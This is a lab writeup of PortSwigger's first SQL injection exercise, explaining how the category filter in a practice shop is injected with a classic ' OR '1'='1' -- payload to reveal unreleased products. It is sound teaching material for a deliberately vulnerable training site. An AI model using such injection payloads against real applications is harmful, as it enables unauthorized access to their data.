---
title: PortSwigger SQL Injection Lab 1 — Retrieving Hidden Data
description: A detailed writeup of PortSwigger's first SQL injection lab, showing how to retrieve hidden data by injecting into a WHERE clause.
author: Koussay Dhifi
categories: [Writeups, WebExploitation]
tags: [WebExploitation, SQLInjection, PortSwigger, Labs]
pin: false
math: false
mermaid: true
---

## Introduction

This is the first PortSwigger SQL injection lab. The goal is to retrieve hidden products by injecting into the category filter.

The vulnerable query is conceptually similar to:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
```

The application exposes a category filter in the URL, which makes it a good starting point for learning SQL injection.

## Recon

The site is a simple e-commerce application with several categories. When a category is selected, the browser requests a URL similar to:

```text
/filter?category=Clothing%2c+shoes+and+accessories
```

This parameter is a strong candidate for injection.

![Lab 1 overview](../assets/sqli/lab1/1-1.png)

## Exploitation

To bypass the `released = 1` condition and list both released and unreleased products, we can inject:

```sql
' OR '1'='1' --
```

This closes the original string, forces the condition to evaluate as true, and comments out the rest of the query.

The resulting payload becomes:

```sql
SELECT * FROM products WHERE category = 'Clothing, shoes and accessories' OR '1'='1' -- AND released = 1;
```

That makes the query return all matching products, which solves the lab.

![Lab 1 solved](../assets/sqli/lab1/1-2.png)

## Conclusion

This lab is a very beginner-friendly introduction to SQL injection. It teaches the classic pattern of breaking out of a quoted string and forcing the condition to always evaluate to true.
